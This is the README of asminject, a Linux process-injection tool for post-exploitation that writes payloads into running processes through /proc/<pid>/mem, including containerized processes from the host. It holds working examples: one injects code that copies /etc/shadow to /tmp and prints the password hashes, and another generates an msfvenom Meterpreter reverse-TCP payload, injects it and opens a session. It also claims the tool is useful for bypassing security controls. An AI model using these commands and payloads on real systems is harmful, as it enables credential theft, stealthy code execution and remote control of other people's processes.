# asminject
asminject is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing /proc/&lt;pid>/mem. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.

This is a very early, alpha-quality version of this utility.

## Origins

When the first version of *asminject* was written, *dlinject* was broken on modern Linux distributions because GNU had hidden the library-loading function in ld-x.y.so hidden. Regardless, the ability to inject arbitrary machine code is arguably stealthier.

## Setup

It's possible to write payloads in pure assembly without referring to libraries. If you're doing that, or using the example payloads that do that, or using a binary payload generated by e.g. *msfvenom*, you can skip this section.

Otherwise, you'll need to examine the list of binaries and libraries that your target process is using, e.g.:

```
# ps auxww | grep python2

user     2144330  0.2  0.1  13908  7864 pts/2    S+   15:30   0:00 python2 ./calling_script.py
                                                                                                                                    
# cat /proc/2144330/maps

560a14849000-560a14896000 r--p 00000000 08:01 3024520                    /usr/bin/python2.7
...omitted for brevity...
7fc63884b000-7fc638870000 r--p 00000000 08:01 3032318                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
...omitted for brevity...
7fc638a10000-7fc638a1f000 r--p 00000000 08:01 3032320                    /usr/lib/x86_64-linux-gnu/libm-2.31.so
...omitted for brevity...
7fc638b54000-7fc638b57000 r--p 00000000 08:01 3016732                    /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
...omitted for brevity...
7fc638b71000-7fc638b72000 r--p 00000000 08:01 3032333                    /usr/lib/x86_64-linux-gnu/libutil-2.31.so
...omitted for brevity...
7fc638b76000-7fc638b77000 r--p 00000000 08:01 3032319                    /usr/lib/x86_64-linux-gnu/libdl-2.31.so
...omitted for brevity...
7fc638b7c000-7fc638b83000 r--p 00000000 08:01 3032329                    /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
...omitted for brevity...
7fc638bc3000-7fc638bc4000 r--p 00000000 08:01 3031631                    /usr/lib/x86_64-linux-gnu/ld-2.31.so                                                                                                               
```

In this case, you could safely call exported functions in eight different binaries. Most of the example payloads will only use one or two, and will match their names based on regexes, but you'll still need to generate a list of the offsets for *asminject* to use. E.g. for this specific copy of */usr/bin/python2.7*:

```
readelf -a --wide /usr/bin/python2.7 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-some_machine-python2.7.txt
```

If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data.

## Example 1: Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, locate the process and inject some arbitrary Python code into it:

```
# ps auxww | grep python2

user     2144294  0.5  0.1  13908  7828 pts/2    S+   15:20   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code-01.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.1
Ben Lincoln, Bishop Fox, 2021-06-07
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Sending SIGSTOP
[*] Waiting for process to stop...
[*] RIP: 0x7fb8b2389e8e
[*] RSP: 0x7ffc68bea978
[*] /usr/bin/python2.7: 0x0000556076bbb000
[*] /usr/lib/locale/locale-archive: 0x00007fb8b1e3e000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007fb8b2613000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007fb8b229b000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007fb8b25c6000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007fb8b2460000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007fb8b25cc000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007fb8b25c1000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007fb8b25a4000
[*] 0: 0x0000556076f31000
[*] [heap]: 0x0000556077db9000
[*] [stack]: 0x00007ffc68bcc000
[*] [vdso]: 0x00007ffc68bf8000
[*] [vvar]: 0x00007ffc68bf4000
[*] Writing assembled binary to /tmp/tmpw5w72z5m.o
[*] Wrote first stage shellcode
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpzc7wee_q.o
[*] Wrote stage 2 to '/tmp/tmp12ouuz74'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmp12ouuz74' in the target container before proceeding
Press Enter to continue...
```

If the target process is a container, copy the binary into its filesystem at this time, then press Enter. Otherwise, just go ahead and press Enter.

```
[*] Continuing process...
[+] Done!
```

Back in the other terminal window, run the *fg* command. Python may segfault, but...

```
 cat /tmp/bishopfox.txt 
root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Example 2: Inject Meterpreter into an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it:

```
# ps auxww | grep python2

root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py

 python3 ./asminject.py 2144476 /mnt/hgfs/c/Users/blincoln/Documents/Projects/Pyrasite_Automation/asminject/lmrt11443 --pause --precompiled

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.1
Ben Lincoln, Bishop Fox, 2021-06-07
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Sending SIGSTOP
[*] RIP: 0x7f550c04ee8e
[*] RSP: 0x7ffc2a975a28
[*] /usr/bin/python2.7: 0x0000558e478a4000
[*] /usr/lib/locale/locale-archive: 0x00007f550bb03000
[*] /usr/lib/x86_64-linux-gnu/ld-2.31.so: 0x00007f550c2d8000
[*] /usr/lib/x86_64-linux-gnu/libc-2.31.so: 0x00007f550bf60000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.31.so: 0x00007f550c28b000
[*] /usr/lib/x86_64-linux-gnu/libm-2.31.so: 0x00007f550c125000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.31.so: 0x00007f550c291000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.31.so: 0x00007f550c286000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007f550c269000
[*] 0: 0x0000558e47c1a000
[*] [heap]: 0x0000558e48fbc000
[*] [stack]: 0x00007ffc2a956000
[*] [vdso]: 0x00007ffc2a9f1000
[*] [vvar]: 0x00007ffc2a9ed000
[*] Writing assembled binary to /tmp/tmp78ods3rv.o
[*] Wrote first stage shellcode
[*] Wrote stage 2 to '/tmp/tmpcmwfovsm'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmpcmwfovsm' in the target container before proceeding
Press Enter to continue...
[*] Continuing process...
[+] Done!
```

In the first terminal, run the *fg* command, and you should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

```
